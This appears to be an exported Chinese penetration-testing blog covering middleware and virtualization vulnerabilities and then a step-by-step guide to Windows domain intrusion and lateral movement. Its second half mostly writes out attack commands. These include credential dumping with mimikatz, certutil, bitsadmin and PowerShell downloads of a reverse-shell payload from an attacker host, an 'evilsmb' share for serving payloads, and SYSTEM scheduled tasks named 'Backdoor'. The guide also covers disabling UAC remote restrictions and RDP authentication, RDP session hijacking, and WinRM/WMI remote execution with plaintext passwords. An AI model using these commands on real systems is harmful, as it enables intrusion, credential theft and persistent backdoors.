<p>可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令</p>
<p><strong>721</strong></p>
<p>原理：RememberMe Cookie 默认通过 AES-128-CBC 模式加密，这种加密容易受到攻击，攻击者可以使用有效的 RememberMe Cookie 作为 Paddding Oracle Attack 的前缀，精心构造 RememberMe Cookie 来实施反序列化攻击</p>
<p><strong>682</strong></p>
<p>但是682这个比较少见</p>
<p>原理：利用的是 shiro 和 spring 对 url 中的 “;” 处理差别来绕过校验</p>
<h6 id="Struts"><a href="#Struts" class="headerlink" title="Struts"></a>Struts</h6><h6 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h6><p>具有反序列化、弱口令、文件上传、远程代码执行</p>
<p>文件上传：在conf&#x2F;web.xml配置文件中，添加readonly设置为false时，使用PUT方法上传任意文件</p>
<p>远程代码执行：使用enableCmdLineArguments在windows系统上运行，漏洞驻留在CGI接口中，jre将命令传递给windows时存在缺陷</p>
<h6 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h6><p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用</p>
<p>JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范</p>
<p>漏洞：未授权进入后台进行文件上传、Java反序列化进行远程代码执行漏洞</p>
<h3 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h3><h2 id="集权管理平台"><a href="#集权管理平台" class="headerlink" title="集权管理平台"></a>集权管理平台</h2><h3 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h3><h4 id="ESXI"><a href="#ESXI" class="headerlink" title="ESXI"></a>ESXI</h4><p>CVE-2021-21974</p>
<p>添加后门账户</p>
<h4 id="Vcenter"><a href="#Vcenter" class="headerlink" title="Vcenter"></a>Vcenter</h4><p>CVE-2021-21972</p>
<p>CVE-2021-21985</p>
<p>CVE-2021-22005</p>
<p>任意文件上传，可能只能获取服务器的权限，需要主机权限得进一步的利用</p>
<h4 id="获取虚拟机密码"><a href="#获取虚拟机密码" class="headerlink" title="获取虚拟机密码"></a>获取虚拟机密码</h4><p>在我们通过手段获取到ESXI或者Vcenter的管理后台之后但是并不能登陆到虚拟机之中这就可以通过下面两个方法进行获取密码</p>
<h5 id="通过快照Dump内存密码"><a href="#通过快照Dump内存密码" class="headerlink" title="通过快照Dump内存密码"></a>通过快照Dump内存密码</h5><p>将虚拟机的快照dump到本地，然后对其进行分析，获取密码</p>
<h5 id="挂在PE-ISO获取虚拟机密码"><a href="#挂在PE-ISO获取虚拟机密码" class="headerlink" title="挂在PE ISO获取虚拟机密码"></a>挂在PE ISO获取虚拟机密码</h5><p>制作一个PE ISO镜像然后挂载到虚拟机上面，然后重启进入到PE系统去抓取密码等</p>
<h4 id="获取虚拟化平台权限（Vcenter）"><a href="#获取虚拟化平台权限（Vcenter）" class="headerlink" title="获取虚拟化平台权限（Vcenter）"></a>获取虚拟化平台权限（Vcenter）</h4><h5 id="data-mdb-Cookie解密"><a href="#data-mdb-Cookie解密" class="headerlink" title="data.mdb Cookie解密"></a>data.mdb Cookie解密</h5><p>寻找本地的.mdb文件，并对cookie进行解密</p>
<h5 id="vdcadmintools改密码"><a href="#vdcadmintools改密码" class="headerlink" title="vdcadmintools改密码"></a>vdcadmintools改密码</h5><p>或者直接修改web端的密码以控制虚拟化平台</p>
<h3 id="终端安全管理系统"><a href="#终端安全管理系统" class="headerlink" title="终端安全管理系统"></a>终端安全管理系统</h3><p>可以一些0day或者nday对其进行利用</p>
<p>360天擎</p>
<p>重点关注一些个人PC</p>
<h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h3><p>可以一些0day或者nday对其进行利用</p>
<p>奇安信奇治堡垒机</p>
<p>绿盟堡垒机</p>
<h3 id="云原生"><a href="#云原生" class="headerlink" title="云原生"></a>云原生</h3><h4 id="K8s组件配置不当"><a href="#K8s组件配置不当" class="headerlink" title="K8s组件配置不当"></a>K8s组件配置不当</h4><h5 id="API-server"><a href="#API-server" class="headerlink" title="API server"></a>API server</h5><p>部署恶意容器逃逸</p>
<p>获取集群权限</p>
<h5 id="kubelet"><a href="#kubelet" class="headerlink" title="kubelet"></a>kubelet</h5><p>获取特权容器权限</p>
<p>获取ServiceAccount登陆凭证—–高权限ServiceAccount用户—获取居群权限</p>
<h5 id="docker-api"><a href="#docker-api" class="headerlink" title="docker api"></a>docker api</h5><p>部署恶意容器逃逸</p>
]]></content>
  </entry>
  <entry>
    <title>内网安全</title>
    <url>/2023/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="基本认知"><a href="#基本认知" class="headerlink" title="基本认知"></a>基本认知</h2><h3 id="网站拓扑"><a href="#网站拓扑" class="headerlink" title="网站拓扑"></a>网站拓扑</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228154128442.png"
                      alt="image-20230228154128442"
                ></p>
<p>一般来说向外部提供服务的服务器存放于DMZ之中（如web服务器），其余较为核心的服务器在内网</p>
<h3 id="局域网、工作组、域环境"><a href="#局域网、工作组、域环境" class="headerlink" title="局域网、工作组、域环境"></a>局域网、工作组、域环境</h3><p>一般来说工作组和域环境的区别就是规模大小的局域网</p>
<p>工作组不存在管理主机，域环境存在便于管理，两者的攻击手法不同</p>
<h4 id="域控制器DC就是所谓的管理主机"><a href="#域控制器DC就是所谓的管理主机" class="headerlink" title="域控制器DC就是所谓的管理主机"></a>域控制器DC就是所谓的管理主机</h4><h4 id="活动目录AD"><a href="#活动目录AD" class="headerlink" title="活动目录AD"></a>活动目录AD</h4><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>分为</p>
<p>单域：只有一个域环境</p>
<p>父子域：相当于子公司和母公司的区别</p>
<p>​	注意：linux系统可以是域控制器，但是功能会比win系统少，且难以管理，所以一般来说域控制器都是用win的系统来实现，linux一般用作服务器</p>
<p>域的组成</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228160643006.png"
                      alt="image-20230228160643006"
                ></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>作用：为了了解到当前服务器的计算机的基本信息，为后续判断都武器角色，网络     环境等做准备。</p>
<p>systeminfo  查看当前已经取得权限主机的详细信息</p>
<p>net start  查看启动的服务</p>
<p>tasklist   进程列表</p>
<p>schtasks 计划任务</p>
<p>判断是否存在域：</p>
<p>ipconfig&#x2F;all</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228163534013.png"
                      alt="image-20230228163534013"
                ></p>
<p>net view &#x2F;domain</p>
<p>判断主域（获取域控的地址）</p>
<p>net time &#x2F;domain</p>
<p>判断当前网络端口开放</p>
<p>netstat -ano</p>
<p>域名 追踪来源地址</p>
<p>nslookup</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228164903139.png"
                      alt="image-20230228164903139"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228165049553.png"
                      alt="image-20230228165049553"
                ></p>
<h3 id="凭据信息收集"><a href="#凭据信息收集" class="headerlink" title="凭据信息收集"></a>凭据信息收集</h3><p>为了收集各种密文、明文、口令等，为后续的横向渗透做好准备</p>
<h4 id="mimikatz（适用于win）的使用"><a href="#mimikatz（适用于win）的使用" class="headerlink" title="mimikatz（适用于win）的使用"></a>mimikatz（适用于win）的使用</h4><p>可以使用该工具收集用户的账号和密码信息，但是域用户会有权限限制该工具的使用，这时候就涉及提权操作，如下图</p>
<p>管理员方式  运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230228225649556.png"
                      alt="image-20230228225649556"
                ></p>
<h4 id="LaZagne（all），XenArmor（win）"><a href="#LaZagne（all），XenArmor（win）" class="headerlink" title="LaZagne（all），XenArmor（win）"></a>LaZagne（all），XenArmor（win）</h4><h4 id="计算机各种协议服务口令获取（获取本地计算机的各种软件密码）"><a href="#计算机各种协议服务口令获取（获取本地计算机的各种软件密码）" class="headerlink" title="计算机各种协议服务口令获取（获取本地计算机的各种软件密码）"></a>计算机各种协议服务口令获取（获取本地计算机的各种软件密码）</h4><h2 id="后续探针"><a href="#后续探针" class="headerlink" title="后续探针"></a>后续探针</h2><h4 id="探针域控制器及地址信息"><a href="#探针域控制器及地址信息" class="headerlink" title="探针域控制器及地址信息"></a>探针域控制器及地址信息</h4><p>信息收集讲过</p>
<h4 id="探针域内存活主机及地址信息"><a href="#探针域内存活主机及地址信息" class="headerlink" title="探针域内存活主机及地址信息"></a>探针域内存活主机及地址信息</h4><p> nbtscan 192.168.3.0&#x2F;24 第三方工具，不推荐，可能被杀</p>
<p>for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”   自带命令探寻主机</p>
<h5 id="powershell脚本nishang工具"><a href="#powershell脚本nishang工具" class="headerlink" title="powershell脚本nishang工具"></a>powershell脚本nishang工具</h5><p>  —导入模块 nishang：Import-Module .\nishang.psm1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/eb5ba3f79d96eb0da2f8ed1d3bdc394277e99a40.png@831w_122h_progressive.webp"
                      alt="img"
                ></p>
<p>#设置执行策略（第一次运行先设置执行策略，这里还是权限不够）</p>
<p>—Set-ExecutionPolicy RemoteSigned</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9deacbf8ab0e310f7b0d09f0562d35d754dff5e2.png@831w_249h_progressive.webp"
                      alt="img"
                ></p>
<p>—以管理员运行powershell，注意这里的密码是DC的密码才行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/18d929307e6e535f289dc3c0c23c6a43b948ddfd.png@831w_335h_progressive.webp"
                      alt="img"
                ></p>
<p>—设置执行策略（首次执行nishang）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9cc6070cb110b2453cdb03faef7384e604d67304.png@831w_162h_progressive.webp"
                      alt="img"
                ></p>
<p>—导入模块</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/41ad41f293fa81f4ce4bf390c57f341530a7e8a0.png@831w_189h_progressive.webp"
                      alt="img"
                ></p>
<p>#获取模块 nishang 的命令函数</p>
<p>—Get-Command -Module nishang（每个参数对应一个功能模块）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/65b8cd453110a0bcc587ae3f5c172eadbfcc4a9a.png@831w_243h_progressive.webp"
                      alt="img"
                ></p>
<p>—调用Invoke-Mimikatz的功能（查询本地windows账号密码）</p>
<p>—这里发现了域控（Administrator）的密码、域用户（webadmin）密码和本地管理员用户（Administrator）密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/47773cafd9fafa040b26a7558a9dd85baf3db1fa.png@831w_392h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/16710e3db0474f31cc7fe2a29a431bb18250f1db.png@698w_299h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/05194c13133762cdee5b81012974ee3405ce88ab.png@831w_393h_progressive.webp"
                      alt="img"
                >![img](<a class="link"   href="https://i0.hdslb.com/bfs/article/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp" >https://i0.hdslb.com/bfs/article/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>#获取常规计算机信息：Get-Information</p>
<p>—登录用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c322ba11203e97845861f74e5bb6003616e6e1e0.png@831w_386h_progressive.webp"
                      alt="img"
                ></p>
<p>—安装的应用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9b52aa996b4c90817f4769d5adb931cc67cc64f6.png@831w_417h_progressive.webp"
                      alt="img"
                ></p>
<p>—启用的服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/fd6cee535ee4bd239ea92d167a0bd8597f0e769d.png@725w_216h_progressive.webp"
                      alt="img"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301132837623.png"
                      alt="image-20230301132837623"
                ></p>
<p>Invoke-Portscan -startAddress 192.168.3.0  -EndAddress 192.168.3.100 -ResolveHost -ScanPort</p>
<p>Invoke-CredentialsPhish弹出密码登入框，不输对不给关</p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h3><h4 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h4><p>Windows的网络共享功能能实现局域网之间的文件共享</p>
<p>执行net share可以开启网络共享，其中C$是C盘共享，Admin$是目录共享</p>
<h6 id="IPC-共享"><a href="#IPC-共享" class="headerlink" title="IPC$共享"></a>IPC$共享</h6><p>条件：远程主机开启了ipc连接        139和445端口要开放</p>
<p>执行</p>
<p><code>net use \\10.10.10.19\IPC$ &quot;Admin123&quot;  /user :&quot;Administrator&quot;</code>实现IPC连接</p>
<p><code>dir \\110.10.10.19</code>实现C盘共享目录</p>
<p><code>copy .\reverse_tcp.exe \\10.10.10.19\C$</code>复制文件到远程主机的C盘</p>
<p>使用其他的命令也可以达到不同的效果</p>
<p>如：<code>net use \\10.10.10.19\C$ &quot;Admin@123&quot; /user:&quot;Administrator&quot;</code>建立远程C$共享</p>
<h4 id="通过搭建SMB服务器"><a href="#通过搭建SMB服务器" class="headerlink" title="通过搭建SMB服务器"></a>通过搭建SMB服务器</h4><p>SMB又称CIFS（网络文件共享系统）</p>
<p>是计算机能共享文件、打印机、等资源，利用应用层tcp传输，端口139、445偏向445</p>
<p>可以在服务器中搭建SMB共享服务器，并将攻击载荷放入共享文件夹，使远程主机能够远程加载共享文件（主义使用匿名共享）</p>
<p>可以利用impacket中的smbserver.py来实现SMB服务器的搭建</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行以下命令即可</span><br><span class="line">mkdir  /root/share</span><br><span class="line">python smbserver.py evilsmb /root/share -smb2support</span><br></pre></td></tr></table></figure></div>

<p>对于Windows，已经获得管理员权限的可以直接手动配置一个SMB服务器</p>
<p>也可以通过Invoke-BuildAnonymousSMBServer在本地快速启动一个匿名共享。</p>
<h4 id="通过Windows自带的工具"><a href="#通过Windows自带的工具" class="headerlink" title="通过Windows自带的工具"></a>通过Windows自带的工具</h4><h6 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h6><p>是一个Windows自带的命令行工具，用于管理证书安装，提供了从网络下载文件的功能，可以先在服务器上部署攻击载荷然后下载下来</p>
<p>执行</p>
<p><code>certutil -urlcache -split -f http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
<p>通过Certutil下载shell.exe，并保存在C:\reverse_tcp.exe</p>
<h6 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h6><p>Bitsadmin是一个命令行工具可以用来创建、下载、上载作业，监视进度</p>
<p><code>bitsadmin \transfer test http://你的IP:端口port/shell.exe C:\reverse_tcp.exe</code></p>
<p>创建一个名为test的Bitsadmin任务，保存shell.exe到C:\reverse_tcp.exe</p>
<h6 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h6><p>可以利用WebClient来实现文件下载</p>
<p><code>(New-Object Net.WebClient).DownloadFile(&#39;http://你的IP:端口port/shell.exe&#39;,&#39;C:\reverse_tcp.exe&#39;)</code></p>
<h3 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h3><p>UAC是用户账户控制，这使计算机能以非管理员模式运行，本地中如何非RID 500的其他用户都以最小权限运行。</p>
<p>为了更好的保护属于本地管理员成员的用户，微软在Windows vista之后引入UAC Remote Restrictions远程限制</p>
<p>这个东西会导致schtasks、PsExec、WMI、WinRM、哈希传递攻击都只能使用RID 500的本地管理员用户，其他用户包括非RID 500的本地管理员用户都会提示“拒绝访问”</p>
<p>从而限制横向移动</p>
<p>关闭</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></div>



<h3 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h3><p>查询是否开启远程桌面</p>
<p><code>reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server&quot; /v fDenyTSConnections</code></p>
<p>0没启动 1启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#本地开启远程桌面功能</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\terminal Server\WinStations\RDP-TCP&quot; /v UserAuthentication /t REG_Dword /d 0</span><br><span class="line">#设置防火墙策略放行3389端口</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">#对于远程主机可以使用WMI来开启远程桌面</span><br><span class="line">wmic /Node:10.10.10.19 /User:Administrator /Pssword:Admin@123 RDTOGGLE WHERE ServerName=&#x27;WIN2016-WEB3&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure></div>

<h6 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h6><p>原理是，当有多个用户使用远程桌面时，就会产生多个RDP会话，并且可以在未授权的情况下成功登入目标系统，即使用户会话已经断开</p>
<p>需要获取SYSTEM权限，正常来说需要密码，但是已经获取了 SYSTEM权限就可以不用密码</p>
<p>操作：在Meterpreter中提权至SYSTEM权限后执行<code>tscon 9</code>即可</p>
<h6 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h6><p>SharpRDP是一款开源工具，需要3389端口，可以在远程主机上执行系统命令，不需要GUI</p>
<p>可以直接将SharpRDP上传到跳板机。然后获取用户凭据，对内网其他主机执行系统命令，就省去代理等中间环节</p>
<h3 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h3><h4 id="执行远程命令"><a href="#执行远程命令" class="headerlink" title="执行远程命令"></a>执行远程命令</h4><p>有两个命令工具：</p>
<p>1.Winrs远程执行命令 </p>
<p>远程管理的客户端程序，提供凭据即可运行，但需要双方都有winrm服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行以下命令，可以执行以下命令</span><br><span class="line">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;whoami&quot;</span><br><span class="line">可以通过这个开启目标的cmd</span><br><span class="line">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;cmd&quot;</span><br></pre></td></tr></table></figure></div>



<p>2.Winrm（.cmd）系统管理命令行工具</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过调用Win32_Process类中的Create方法来创建远程进程</span><br><span class="line">实战中可以执行一个攻击载荷</span><br><span class="line">winem invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=&quot;notepad.exe&quot;&#125; -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123</span><br></pre></td></tr></table></figure></div>

<h4 id="利用WinRM获取交互式会话"><a href="#利用WinRM获取交互式会话" class="headerlink" title="利用WinRM获取交互式会话"></a>利用WinRM获取交互式会话</h4><h6 id="powershell利用"><a href="#powershell利用" class="headerlink" title="powershell利用"></a>powershell利用</h6><p>powershell的远程传输协议基于WinRM规范，且可以远程管理</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定远程的用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">指定用户密码</span><br><span class="line">$password = ConverTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line">将用户名和密码整合，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line">根据提供的凭据创建会话</span><br><span class="line">New-PSSession -Name（指定的创建会话名称） WinRM1 -ComputerName（指定要连接的主机IP或主机名） 10.10.10.19 -Credential（指定有权连接到远程主机的用户凭据） $Cred -Port（指定WinRM的工作端口） 5985</span><br></pre></td></tr></table></figure></div>

<p><code>Get-PSSession</code>查看当前已经创建的PSSession会话</p>
<p>选中一个会话并且执行<code>Enter-PSSession -Name WinRM1</code>进入会话交互模式</p>
<p>也可以通过Invoke-Command执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定远程的用户名</span><br><span class="line">$User = &quot;HACK-MY\Administrator&quot;</span><br><span class="line">指定用户密码</span><br><span class="line">$password = ConverTo-SecureString -String &quot;Admin@123&quot; -AsPlainText -Force</span><br><span class="line">将用户名和密码整合，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password</span><br><span class="line">根据提供的凭据创建会话</span><br><span class="line">$Sess = New-PSSession -Name（指定的创建会话名称） WinRM1 -ComputerName（指定要连接的主机IP或主机名） 10.10.10.19 -Credential（指定有权连接到远程主机的用户凭据） $Cred -Port（指定WinRM的工作端口） 5985</span><br><span class="line">在创建的会话中执行命令</span><br><span class="line">Invoke-Command -Session $Sess -ScriptBlock &#123; dir c:\&#125;</span><br></pre></td></tr></table></figure></div>

<h6 id="Evil-Winrm"><a href="#Evil-Winrm" class="headerlink" title="Evil-Winrm"></a>Evil-Winrm</h6><p>Evil-winrm是一种基于Winrm Shell的渗透架构，可以通过提供用户名密码和哈希值在启用了WinRM服务的目标主机上完成的简单的攻击任务</p>
<h4 id="域横向批量at-amp-schtasks-amp-impacket"><a href="#域横向批量at-amp-schtasks-amp-impacket" class="headerlink" title="域横向批量at&amp;schtasks&amp;impacket"></a>域横向批量at&amp;schtasks&amp;impacket</h4><h5 id="横向渗透明文传递at-amp-schtasks"><a href="#横向渗透明文传递at-amp-schtasks" class="headerlink" title="横向渗透明文传递at&amp;schtasks"></a>横向渗透明文传递at&amp;schtasks</h5><p>在拿下一台内网主机之后，通过本地信息收集用户凭证信息之后，应该如何很横向渗透拿下更多的主机，这里就涉及到at&amp;schtasks命令的使用，在一直目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令</p>
<p>主要步骤：获取到某域主机权限-&gt;mimikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表做字典 -&gt;用到密码明文当作密码字典-&gt;尝试连接–&gt;穿甲计划任务（at&amp;schtasks）-&gt;执行文件可为后门或者相关命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301145205438.png"
                      alt="image-20230301145205438"
                ></p>
<p>IPC建立失败原因</p>
<p>对方未开启139，445端口等</p>
<p>—dir \xx.xx.xx.xx\C$\ # 查看文件列表</p>
<p>—copy \xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件</p>
<p>—copy 1.bat \xx.xx.xx.xx\C$ # 复制文件</p>
<p>—net use \xx.xx.xx.xx\C$\1.bat &#x2F;del # 删除 IPC</p>
<p>—net view xx.xx.xx.xx # 查看对方共享</p>
<h6 id="at-lt-windows-2012"><a href="#at-lt-windows-2012" class="headerlink" title="at &lt; windows 2012"></a>at &lt; windows 2012</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301145843892.png"
                      alt="image-20230301145843892"
                ></p>
<p>首先利用信息收集工具收集到域控主机的地址信息，然后利用这个地址信息建立ipc连接，在利用已经攻陷的web服务器主机向域控主机复一个add.bat文件，该文件内容为创建一个用户（实际中一般植入病毒后门），再利用at定时自动执行在域上执行该文件，则就建立了一个用户schtasks &gt;&#x3D; windows 2012</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301150838876.png"
                      alt="image-20230301150838876"
                ></p>
<h6 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301152547387.png"
                      alt="image-20230301152547387"
                ></p>
<p>计划任务</p>
<p><code>schtasks /Create /S 192.168.30.30 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</code></p>
<p>立即执行</p>
<p><code>schtasks /RUN /S 192.168.30.30 /I /TN Backdoor</code></p>
<p>删除</p>
<p><code>schtasks /Delete /S 192.168.30.30 /TN Backdoor /F</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#也可以通过将命令的文件写入文件，通过type命令读取</span><br><span class="line">schtasks /Create /S 19.168.30.30 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c &#x27;whoami&#x27; &gt; C:\resulit.txt&quot; /RU System /f</span><br><span class="line"></span><br><span class="line">type \\192.168.30.30\C$\result.txt     #读取执行结果</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h6 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h6><p>Windows可以利用UNC路径来访问网络共享资源</p>
<p>1.现在服务器中搭建SMB匿名共享服务，并生成攻击载荷放入共享目录</p>
<p>2.执行</p>
<p><code>schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR \\192.168.2.143\ evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123</code></p>
<p>在远程主机10.10.10.19中创建计划任务，使用UNC路径加载位于192.168.2.143共享中的攻击载荷并执行</p>
<h3 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h3><p>WMI是Windows管理技术，通过调用WMI类的方法进行远程执行</p>
<p>执行远程查询，查询远程主机的进程信息</p>
<p><code>wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 process li st brief</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174150555.png"
                      alt="image-20230317174150555"
                ></p>
<p>创建远程进程</p>
<p><code>wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 process call create &quot;cmd.exe /c ipconfig &gt; C:\jieguo.txt&quot;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174534828.png"
                      alt="image-20230317174534828"
                ></p>
<p>因为没有回显所以需要利用type进行查看</p>
<p><code>type \\192.168.30.10\C$\jieguo.txt</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174549486.png"
                      alt="image-20230317174549486"
                ></p>
<p>还可以使用远程安装MSI文件</p>
